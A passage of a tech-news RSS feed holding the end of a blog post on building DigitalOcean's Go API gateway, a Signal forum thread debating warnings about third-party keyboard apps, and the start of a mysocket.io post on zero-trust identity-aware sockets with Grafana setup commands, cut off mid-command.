<p>DigitalOcean had 3 monoliths back in 2016 when we started (all 3 are still alive today, albeit much smaller than they were before). Why were there 3? There is a shared library that contains most of the logic that all 3 applications use, so in reality we had one “monolith library” that was reused at all 3, most logic changes were made into this library and then it would be upgraded at every single app separately. The library still exists today and continues to be updated every once in a while.</p>

<p>As you can imagine, as more and more changes started to happen, with the company growing incredibly fast both in terms of business and hiring, this wasn’t ideal. Many times someone would change this core library, deploy one of the apps (the control pane you see when you sign in), but not the JSON API. So you could end up with a new feature visible at the control panel but not at the API. There would always be a time when this library version wouldn’t match across all applications, as we were not deploying them all at once every single time, so there was always space for there to be a mismatch of features available.</p>

<p>This also meant that the test suite was growing by leaps and bounds, getting slower, making running the test suite and deployments a pain. There was growing interest in doing something about this, but we couldn’t just migrate everything out. There was also a lot of interest in NOT doing Ruby anymore. There was a growing body of Golang code all over the place and people wanted to use it for their new services instead of building it all inside the old monoliths.</p>

<p>There was a catch here though, how could they possibly do all the things the Rails apps were doing, like authentication, rate limiting, authorization, feature flipping, routing, error handling and all the shared logic, in a new language, without repeating the same thing across all new projects?</p>

<p>We needed something that would be language agnostic and could be run side by side with the existing monoliths. At this point we knew a library ( like Twitter’s Finagle) wasn’t an option. Our solution had to work with the old Ruby code and the new Golang stuff (and JS, maybe Python. It was all up in the air back then). We wouldn’t be able to build a library with all the shared features needed in multiple languages.This is where the API gateway comes in.</p>



<p>The microservices.io patterns list has a great definition for the <a href="https://microservices.io/patterns/apigateway.html">API gateway</a>:</p>

<div><div><pre><code>Implement an API gateway that is the single entry point for all clients. The API gateway handles requests in one of two ways. Some requests are simply proxied/routed to the appropriate service. It handles other requests by fanning out to multiple services. 
</code></pre></div></div>

<p>It took us multiple meetings and discussions between Joonas Bergius, Nan Zhong, Joe Friedl, me and even Phil Calçado, who was the engineering lead (not sure if this was actually the title but he was the boss), to come to the realization that we were going to build an API gateway.</p>

<p>What came out of the brainstorms:</p>

<ul>
  <li>It was going to be a pure HTTP proxy, no GRPC, GraphQL or other special protocols;</li>
  <li>We would not change request or response bodies, so there wouldn’t be any protocol translation. Applications would be responsible for parsing the input and producing valid outputs, in the format the client was expecting;</li>
  <li>We’d augment the requests and responses with extra information encoded as HTTP headers, including user information, rate limiting details, tracing metadata, features enabled, so all downstream applications would have to do was looking at the headers, not special exchange format.</li>
  <li>Route configuration would be self-service, teams would call a service with their route configuration and the proxy would automatically pick up changes and update it’s routing table. It would perform basic health checking and remove destinations that weren’t reachable, but otherwise would take any request and forward it to the registered services.</li>
  <li>It would also include filters that could be run before or after a request was processed, these filters would include authentication, rate limiting, feature flipping and all the other shared pieces teams would need to be available to build apps out of the monoliths.</li>
</ul>

<p>Does it look a lot like Java’s Servlet API or Ruby’s Rack? Of course, those were the main inspirations for the design. Going for a simple, well known, design would make us move faster as there would be less stuff to do and we could always complicate it in the future. This was one of the best decisions we made and this is still the way it works nowadays.</p>

<p>Why didn’t we pick something that existed? Fair question. There really weren’t many options back then and the ones that did exist did not make it easy to integrate custom code. Our very first challenge was to decrypt and parse Rails sessions to authenticate users, and there was plenty of complex code to decrypt, unmarshal (from Ruby’s serialization format) and make sense of session data.</p>

<p>Nginx, that was one of the options when we started, only offered integration through Lua scripts, so we’d have to write this session decrypting and parsing logic in Lua scripts we’d bundle with our custom Nginx install and that did not feel like a great solution. It was hard to test the scripts, no one had any experience with Lua and the whole setup wasn’t robust, these scripts were seen mostly as doing small changes in the request flow, not for building complex logic.</p>

<p>So, we started building our own API gateway in Golang.</p>



<p>Once we had the basic proxy built, we placed it in front of some of the traffic, to make sure it could proxy correctly. The first two “filters” we built were the authentication filters, for Rails sessions and OAuth tokens. To roll these out, we started by “doing” the filter work for both monoliths but not acting on them, we’d check if the output we came to in our implementation was the same the monoliths decided on and if the response was also the same; if our own service said a request should be denied but the monoliths responded with an OK or the other way around, we’d log that and work on figuring out why it didn’t work.</p>

<p>As we built these filters, another pattern emerged, instead of having all this code inside the API gateway itself, we thought it would be faster to separate the code into a separate service. The initial goal was mostly to make it reusable by other teams if needed and make it easier for us to deploy smaller changes as deploying the gateway itself was a complicated and slow process (due to the way our internal K8s clusters networking was setup back then, we couldn’t run the gateway on them, so it ran on droplets). After that, almost all filters were just glue code to call an external service that actually knew how to get the job done.</p>

<p><img src="https://mauricio.github.io/images/api-gateway.png" alt="API Gateway simple architecture diagram" title="API Gateway simple architecture diagram"></p>

<p>While it was a response to environmental constraints and not really something we planned, this design made the gateway itself smaller and more reliable. A lot of the logic would live in these microservices instead of the gateway and updates to them had a much smaller blast radius when something went awry.</p>

<p><a href="https://twitter.com/nanzhong">@nanzhong</a> finally switched it to serve all traffic sometime in November 2016, a couple months after our announcement, including full support for authentication with the Rails session and OAuth tokens.</p>



<p>So far we had only done work internally. We weren’t exposing any of this to other teams yet, as we wanted to verify it was all behaving as expected before letting people register their services. The first integrations were bumpy and the experience for the teams we were integrating with was hard.</p>

<p>We lacked documentation and good examples. Teams had to come to us frequently to make sure their services were really up, their configurations were valid, how routing would work (what options are available? Can I use wildcards? Can I use URL parameters? In what order are routes matched?) and how they should integrate route registration into their workflows. This led to a lot of manual labor on our end helping people do stuff they could be doing themselves had we done the work to make it easier to onboard them. The lesson here was clear, if you’re working on infrastructure, make sure you can stay out of the way when people are doing their work, you want them to work on their time and not be an impediment for their work.</p>

<p>We also lacked best practices for what the backend services should look like. Multiple teams were being formed of new developers that didn’t have a lot of experience with building applications with Golang and we did not provide guidance here on how they should set up their applications and what configurations were important.</p>

<p>One recurrent issue we had at the beginning was that <a href="https://golang.org/pkg/net/http/#Server">Golang’s http.Server</a> class assumes all timeouts are infinite unless you set them (ReadTimeout, ReadHeaderTimeout, WriteTimeout, WriteIdleTimeout) and this would lead to services getting a broken connection from the client (the API gateway) and wouldn’t know what it was until we checked their configs and noticed they just didn’t set a value (while we did have a max timeout for all requests on our end, so we’d close a connection that took too long).</p>

<p>Providing better guidance here for basic options and configurations that teams should be doing in all their apps would have saved a lot of time and effort for everyone.</p>

<p>Next, when registering routes, teams would talk directly to the key-value store we were using to store the routing table (Consul) and as you can imagine this wasn’t ideal. There was very little validation in place and it was super simple for people to register routes that wouldn’t load or that wouldn’t really route anything due to being incomplete. …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://mauricio.github.io/2021/01/14/building-digitaloceans-api-gateway.html">https://mauricio.github.io/2021/01/14/building-digitaloceans-api-gateway.html</a></em></p>]]>
            </description>
            <link>https://mauricio.github.io/2021/01/14/building-digitaloceans-api-gateway.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25793830</guid>
            <pubDate>Fri, 15 Jan 2021 17:58:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[68.3% of people in China use third-party keyboards – many of them use Signal]]>
            </title>
            <description>
<![CDATA[
Score 91 | Comments 65 (<a href="https://news.ycombinator.com/item?id=25793438">thread link</a>) | @resynth1943
<br/>
January 15, 2021 | https://community.signalusers.org/t/signal-should-warn-users-who-are-likely-using-insecure-ime-apps/10272 | <a href="https://web.archive.org/web/*/https://community.signalusers.org/t/signal-should-warn-users-who-are-likely-using-insecure-ime-apps/10272">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main-outlet">
        

  


      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          


          <p><span>
              <time itemprop="datePublished" datetime="2019-11-22T18:00:26Z">
                November 22, 2019,  6:00pm
              </time>
              <meta itemprop="dateModified" content="2019-11-22T18:00:26Z">
          <span itemprop="position">#1</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          <p>Inspired by this thread: <a href="https://twitter.com/RealSexyCyborg/status/1197695344575799296" rel="nofollow noopener">https://twitter.com/RealSexyCyborg/status/1197695344575799296</a></p>
<p>“68.3% of smartphones in China are using third-party IME apps.” (<a href="http://web.cse.ohio-state.edu/~lin.3021/file/SEC15.pdf" rel="nofollow noopener">http://web.cse.ohio-state.edu/~lin.3021/file/SEC15.pdf</a>)</p>
<p>Anecdotal evidence (from the above thread) warns that users unfamiliar with IME (or careless about its risks) are promoting Signal as “secure” without pointing out the dangers associated with third-party IME. This undercuts the purpose of the app for a large group of people, many of whom face far graver consequences for insecure communications than their English-speaking counterparts.</p>
<p>When Signal detects the user speaks a language likely to be accompanied by third-party IME, it should visibly warn the user of the risks.</p>
        </div>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">
          <meta itemprop="keywords" content="">

        

         

            
      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/dc7ia"><span itemprop="name">dc7ia</span></a>
            
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2019-11-22T18:36:33Z">
                November 22, 2019,  6:36pm
              </time>
              <meta itemprop="dateModified" content="2019-11-22T18:36:33Z">
          <span itemprop="position">#2</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          <p>Welcome to the forum.</p>
<p>What does IME stand for?</p>
        </div>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        
        <div itemprop="articleBody">
          

<p>I could not have summed it up better… While I understand the concern, I don’t see Signal being responsible for solving this threat vector.</p>

<p>When Signal would do that, the same people would go nuts, saying that this is a violation and Signal should not track that. This time I would agree.</p>
        </div>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/PiCob"><span itemprop="name">PiCob</span></a>
            
          </span></p>


          <p><span>
              <meta itemprop="datePublished" content="2019-11-22T20:09:07Z">
              <time itemprop="dateModified" datetime="2019-11-22T20:09:19Z">
                November 22, 2019,  8:09pm
              </time>
          <span itemprop="position">#4</span>
          </span>
        </p></div>
        <p>input method editor (e.g. software keyboard)</p>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        
        <div itemprop="articleBody">
          
<p>I too, have to agree that Signal should not police how you are using your device (nor should any other software, unless it is a specific tool designed for that purpose).</p>
        </div>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/dc7ia"><span itemprop="name">dc7ia</span></a>
            
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2019-11-22T21:21:55Z">
                November 22, 2019,  9:21pm
              </time>
              <meta itemprop="dateModified" content="2019-11-22T21:21:55Z">
          <span itemprop="position">#6</span>
          </span>
        </p></div>
        <p>Can Android apps get checksums of other apps? Then it could warn about some non legit apps at least.</p>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/johanw666"><span itemprop="name">johanw666</span></a>
            (Johanw666)
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2019-11-22T23:38:58Z">
                November 22, 2019, 11:38pm
              </time>
              <meta itemprop="dateModified" content="2019-11-22T23:38:58Z">
          <span itemprop="position">#8</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          
<p>Ony if you have root. But they can get a list of installed packages.</p>
        </div>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/mac9416"><span itemprop="name">mac9416</span></a>
            (Michael Crenshaw)
          </span></p>


          <p><span>
              <meta itemprop="datePublished" content="2019-11-23T13:06:24Z">
              <time itemprop="dateModified" datetime="2019-11-23T13:11:23Z">
                November 23, 2019,  1:11pm
              </time>
          <span itemprop="position">#9</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          <blockquote>
<p>Wait so just to be clear, the “signal vulnerability” is that Android’s Chinese keyboard sucks and people use a third party app?</p>
</blockquote>
<blockquote>
<p>While I understand the concern, I don’t see Signal being responsible for solving this threat vector.</p>
</blockquote>
<p>“Responsibility” is a bit illusory. I think it’s more useful to consider how easy it would be to add a feature that could really help people. If the impact outweighs the difficulty (and I think it probably does), then whether Signal is obligated to make the change seems like a red herring.</p>
<p>One philosopher could argue that the developers are responsible for nothing, since the app is free. Another could argue that they’re responsible for every possible “butterfly effect” of their decisions. That debate is a bit academic and I don’t think especially helpful for making decisions about feature requests.</p>
<blockquote>
<p>When Signal would do that, the same people would go nuts, saying that this is a violation and Signal should not track that. This time I would agree.</p>
</blockquote>
<p>Loss of users’ trust if the app gives the impression of “spying” on their language is a fair concern. But I think it could be implemented in a way that “tracks” nothing and offers a warning that allays any user concerns. For example, there could be a heuristic of “50% or more Chinese characters”. The first time an outgoing message triggers that heuristic, Signal could display a one-time warning. For example" It looks like you’re writing in Chinese. If you are using a third-party Chinese keyboard, it may not be secure. Consider using the phone’s built-in keyboard."</p>
        </div>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/mac9416"><span itemprop="name">mac9416</span></a>
            (Michael Crenshaw)
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2019-11-23T13:09:07Z">
                November 23, 2019,  1:09pm
              </time>
              <meta itemprop="dateModified" content="2019-11-23T13:09:07Z">
          <span itemprop="position">#10</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          <blockquote>
<p>I too, have to agree that Signal should not police how you are using your device (nor should any other software, unless it is a specific tool designed for that purpose).</p>
</blockquote>
<p>Absolutely, and I wouldn’t recommend any form of policing. But a well-timed and well-placed warning of this <em>very</em> common threat wouldn’t be (and I don’t think would even be perceived as) policing. The warning could be phrased in a way that emphasizes the risks of using third-party IME <em>alongside</em> Signal and makes no general claims about whether the user should take advantage of those apps in other contexts.</p>
        </div>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/mac9416"><span itemprop="name">mac9416</span></a>
            (Michael Crenshaw)
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2019-11-23T13:14:00Z">
                November 23, 2019,  1:14pm
              </time>
              <meta itemprop="dateModified" content="2019-11-23T13:14:00Z">
          <span itemprop="position">#11</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          
<p>That sounds like it has the potential to be a really slick heuristic. “You seem to be using X app… here’s why that might be a problem.” On the other hand, there might be a higher risk of false positives than with a “50%+ Chinese characters” heuristic. I’ll have to defer to folks who know more about app development.</p>
        </div>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/johanw666"><span itemprop="name">johanw666</span></a>
            (Johanw666)
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2019-11-23T13:18:26Z">
                November 23, 2019,  1:18pm
              </time>
              <meta itemprop="dateModified" content="2019-11-23T13:18:26Z">
          <span itemprop="position">#12</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          <p>Well, it has sometimes uses if you want to launch another app from an app with an intent. For example, if your app includes a user manual in pdf form and wants to show it in the standard pdf reader on the device. If there is no pdf reader you want to give a warning explaining the issue.</p>
<p>Code to heck it is really easy, see <a href="https://stackoverflow.com/questions/2695746/how-to-get-a-list-of-installed-android-applications-and-pick-one-to-run" rel="nofollow noopener">this article on Stackoverflow</a> how to do that.</p>
<p>The asked for checksum would require to locate the installed apk and read it, which requires root. And split apk’s would make it even more difficult.</p>
        </div>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/wrapper"><span itemprop="name">wrapper</span></a>
            (Bobby)
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2021-01-12T14:40:33Z">
                January 12, 2021,  2:40pm
              </time>
              <meta itemprop="dateModified" content="2021-01-12T14:40:33Z">
          <span itemprop="position">#13</span>
          </span>
        </p></div>
        <p>Just here to bump this issue as it is clearly still relevant and is quite concerning that Signal isn’t offering a response?</p>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/newuser"><span itemprop="name">newuser</span></a>
            
          </span></p>


          <p><span>
              <meta itemprop="datePublished" content="2021-01-12T15:00:30Z">
              <time itemprop="dateModified" datetime="2021-01-12T15:02:46Z">
                January 12, 2021,  3:02pm
              </time>
          <span itemprop="position">#15</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          <p>There was a lot of discussion on warning users that notifications could also be logged. It seems like there are a lot of problematic things in Android that people need to be aware of and protect themselves accordingly. I’m not sure how much of a role Signal should play in that or even if it needs to.</p>
<p>Other things I can immediately think of:<br>
export a photo?it might get stored in some cloud service<br>
listening to a voice note? the digital assistant might also be listening to it</p>
        </div>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/wrapper"><span itemprop="name">wrapper</span></a>
            (Bobby)
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2021-01-12T15:18:56Z">
                January 12, 2021,  3:18pm
              </time>
              <meta itemprop="dateModified" content="2021-01-12T15:18:56Z">
          <span itemprop="position">#16</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          <p>I understand the argument. The issue is that with the huge influx of new users, Signal do have a responsibility to flag such potential security flaws.</p>
<p>It seems like a pretty obvious thing for them to offer an untracked keyboard option in the app anyway, like some banking apps do. Or just a warning to ensure your Android device is secure.</p>
        </div>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/jwithing"><span itemprop="name">jwithing</span></a>
            (Jeff)
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2021-01-12T15:24:29Z">
                January 12, 2021,  3:24pm
              </time>
              <meta itemprop="dateModified" content="2021-01-12T15:24:29Z">
          <span itemprop="position">#17</span>
          </span>
        </p></div>
        <p>I agree that Signal should warn users who are using insecure IME. Signal has a responsibility to clearly communicate attack vectors to users, especially as an increasing number of less sophisticated users join the platform.</p>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/newuser"><span itemprop="name">newuser</span></a>
            
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2021-01-12T15:33:39Z">
                January 12, 2021,  3:33pm
              </time>
              <meta itemprop="dateModified" content="2021-01-12T15:33:39Z">
          <span itemprop="position">#18</span>
          </span>
        </p></div>
        <p>Do you mean the incognito keyboard setting or do you want them to include a keyboard of their own? If the latter, it probably could be a well vetted separate app that someone else provides.</p>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

            
      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/wrapper"><span itemprop="name">wrapper</span></a>
           …</span></p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://community.signalusers.org/t/signal-should-warn-users-who-are-likely-using-insecure-ime-apps/10272">https://community.signalusers.org/t/signal-should-warn-users-who-are-likely-using-insecure-ime-apps/10272</a></em></p>]]>
            </description>
            <link>https://community.signalusers.org/t/signal-should-warn-users-who-are-likely-using-insecure-ime-apps/10272</link>
            <guid isPermaLink="false">hacker-news-small-sites-25793438</guid>
            <pubDate>Fri, 15 Jan 2021 17:29:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Identity Aware Sockets – zero trust]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25793432">thread link</a>) | @bgpdude
<br/>
January 15, 2021 | https://www.mysocket.io/post/introducing-identity-aware-sockets-enabling-zero-trust-access-for-your-private-services | <a href="https://web.archive.org/web/*/https://www.mysocket.io/post/introducing-identity-aware-sockets-enabling-zero-trust-access-for-your-private-services">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-hook="post-description"><article><div><div data-rce-version="8.13.3"><div dir="ltr"><div><div id="viewer-f7ddu"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.mysocket.io/post/introducing-identity-aware-sockets-enabling-zero-trust-access-for-your-private-services" data-pin-media="https://static.wixstatic.com/media/3b930f_3435790ea1404e07901cfb8dd840f2f7~mv2.png/v1/fit/w_1000%2Ch_1000%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/3b930f_3435790ea1404e07901cfb8dd840f2f7~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png"></p></div></div></div></div><p id="viewer-6ffpc"><span><em>In this blog post, we’ll introduce an exciting new feature that, with the help of Mysocket, allows you to deploy your own Beyond Corp setup.</em></span></p><h2 id="viewer-61f1u"><span>What is Zero Trust</span></h2><p id="viewer-2o96s"><span>The main concept behind Zero Trust is that users shouldn’t just be trusted because they are on your network. This implicit trust problem is something we typically see with, for example, corporate VPNs. With most corporate VPN’s once a user is authenticated, the user becomes part of the corporate network and, as a result, has access to many of the resources within the corporate infrastructure. In other words, once you’re on the VPN, you’re within the walls of the castle, you’re trusted, and you have lots of lateral access.</span></p><p id="viewer-btiap"><span>The world is changing, and the once traditional approach of trusting devices on your network are over. A few years ago, Google started the journey to their implementation of Zero trust called Beyond Corp. One of the core building blocks to get to a Zero Trust model is Identity aware application proxies. These proxies can provide strict access control on a per-application granularity, taking the users’ identity and contexts such as location and device status into account.</span></p><h2 id="viewer-3ila3"><span>Identity aware proxies</span></h2><p id="viewer-57q5s"><span>As of today, the Mysocket proxies have support for OpenID Connect, and with that, your sockets are identity-aware. This means that mysocket users can now enable authentication for their services and provide authorization rules.</span></p><pre id="viewer-5rebq"><span>mysocketctl connect \
   --port 3000 \
   --name "My Identity aware socket" \
   --cloudauth \
   --allowed_email_domains "mycorp.com" \
   --allowed_email_addresses "<a href="mailto:contractor1@gmail.com" target="_blank" rel="noopener">contractor1@gmail.com</a><a href="mailto:,john@doe.com" target="_blank" rel="noopener">,john@doe.com</a>"</span></pre><p id="viewer-d2hm3"><span>The example above shows how we can enable authentication by using the “<em>cloudauth</em>” CLI parameter. With <em>cloudauth</em> enabled, users will be asked to authenticate before access to your service is granted. Currently, we support authentication using Google, Facebook, Github, or locally created accounts. </span></p><p id="viewer-1dt8o"><span>The authentication flow uses OpenID connect to interact with the various Identity providers (IDP); thus, we can easily add more Identity providers in the future. We’re also looking at SAML as a second authentication flow. Please let us know if you have a need for more IDP’s or SAML, and we’ll work with you.</span></p><h2 id="viewer-4nklj"><span>Authorizations rules</span></h2><p id="viewer-8klui"><span>In addition to what the Identity Service Provider (IDP) provides, mysocket also provides two authorization rules. The <em>— allowed_email_domain </em>allows users to specify a comma-separated list of email domains. If your users are authenticating using their <em>mycorp.com</em> email address, then by adding this domain as an <em>allowed_email_domain</em>, will make sure only users with that domain have will be granted access.</span></p><p id="viewer-dv1a2"><span>Since multiple identities providers are supported, it’s easy to extend access to contractors or other 3rd party users. To provide access to external contractors that are not part of your mycorp.com domain, we can use the <em>allowed_email_addresses</em> parameter to add individual identities. This is great because now you can provide these contractors access without creating corporate accounts for them.</span></p><p id="viewer-50slu"><span>These are just two authorization rules; we’re planning to add more types of rules in the near future. Additional authorization rules that come to mind are, Geo-based rules (only allow access from certain countries or regions) or time of day type rules. If you require these types of rules or have suggestions for additional authorization rules, please let us know!</span></p><h2 id="viewer-6g4ct"><span>VPN replacement</span></h2><p id="viewer-ejnaq"><span>One of the unique features of mysocket is that the origin server initiates the connection to the Mysocket edge. This means that the origin servers can be on a highly secure network that only allows outbound connections. Meaning the origins can be hosted behind strict firewall rules or even behind NAT, like for example, a Private AWS VPC. With this, your origin server remains private and hidden.</span></p><p id="viewer-7eejt"><span>With the addition of authentication and authorization to Mysocket, we can now, on a very granular basis, provide access to your private services. Combining the secure outbound tunnel property and the identity-aware sockets, we can now look at this to provide an alternative to VPNs, while providing much more granular access to private or corporate resources.</span></p><div id="viewer-3l8b0"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.mysocket.io/post/introducing-identity-aware-sockets-enabling-zero-trust-access-for-your-private-services" data-pin-media="https://static.wixstatic.com/media/3b930f_0db243c8687b436985efba502bc9ed8a~mv2.png/v1/fit/w_1000%2Ch_700%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/3b930f_0db243c8687b436985efba502bc9ed8a~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png"></p></div></div></div></div><h2 id="viewer-adqh4"><span>Example use case</span></h2><p id="viewer-8d2kt"><span>Imagine a scenario where you work with a contractor that needs access to one specific private application, say an internal wiki, ticket system, or the git server in your corporate network. With the traditional VPN setup, this means we’d need to provide the contractor with a VPN account. Typically this means the contractor is now part of the corporate network, has a corporate user account, and now has access to much more than just the application needed.</span></p><blockquote id="viewer-53kp2"><span>Instead, what we really want is to <strong><em>only</em></strong> provide access to the one application and be very granular in who has access. With the addition of identity-aware sockets, this is now possible.</span></blockquote><h2 id="viewer-bo80k"><span>Demo time!</span></h2><p id="viewer-ep41j"><span>Alright, let’s give this a spin, demo time! In this demo, we’re making a Grafana instance that’s on a private network and behind two layers of NAT available to our employees as well as a contractor.</span></p><p id="viewer-3tb1b"><span>We’ll start by setting up the socket and tunnel using the “<em>mysocketctl connect</em>” command.</span></p><p id="viewer-d4s79"><span>This works great for demo’s; for more permanent setups, it’s recommended to use “<em>mysocketctl</em> <em>socket create</em>” and “<em>mysocketctl</em> <em>tunnel create</em>” so that you have a permanent DNS name for your service.</span></p><pre id="viewer-9m2bk"><span>mysocketctl connect \
   --port 3000 \
   --name "My Identity aware socket" \
   --cloudauth \
   --allowed_email_domains "mycorp.com" \
   --allowed_email_addresses "<a href="mailto:contractor1@gmail.com" target="_blank" rel="noopener">andree@toonk.io</a><a href="mailto:,john@doe.com" target="_blank" rel="noopener">,john@doe.com</a>"</span></pre><p id="viewer-4n3gg"><span>With this, we created a socket on the mysocket.io infrastructure, enabled authentication, and provided a list of authorization rules. The same command also created the secure tunnel to the closest mysocket.io tunnel server, and we’re forwarding port 3000 on localhost to the newly created socket.</span></p><p id="viewer-kdc9"><span>Next, we launch a Grafana container. For fun, I’m passing in my AWS cloudwatch credentials, so I can create some dashboards for my AWS resources. I’ve configured grafana for proxy authentication. Meaning it will trust mysocket.io to do the authentication and authorization. Grafana will use the HTTP headers added by mysocket to determine the user information.</span></p><pre id="viewer-cdq3v"><span><span>[</span>auth<span>.</span>proxy<span>]</span>
enabled <span>=</span> <span>true</span>
header_name <span>=</span> <span>X</span><span>-</span>Auth<span>-</span>Email
header_property <span>=</span> username
auto_sign_up <span>=</span> <span>true</span>
headers <span>=</span> Email<span>:</span><span>X</span><span>-</span>Auth<span>-</span>Email</span></pre><p id="viewer-6vrn5"><span>The complete example grafana.ini config file I used can <a href="https://github.com/mysocketio/examples/tree/main/2021-01-14-authentication-zero-trust-grafana" target="_blank" rel="noopener"><u>be found here</u></a>. Now we’re ready to launch Grafana. I’m doing this from my laptop, using Docker.</span></p><pre id="viewer-7ubcl"><span>docker run <span>-</span>i <span>-</span>v grafana<span>.</span>ini<span>:</span><span>/</span>etc<span>/</span>grafana<span>/</span>grafana<span>.</span>ini \
 <span>-</span>e “<span>GF_AWS_PROFILES</span><span>=</span><span>default</span>” \
 <span>-</span>e “GF_AWS_default_ACCESS_KEY_ID<span>=</span>$<span>ACCESS_KEY_ID</span>” \
 <span>-</span>e “GF_AWS_default_SECRET_ACCESS_KEY<span>=</span>$<span>SECRET_ACCESS_KEY</span>” \
 <span>-</span>e “GF_AWS_default_REGION<span>=</span>us<span>-</span>east<span>-</span><span>1</span>” \
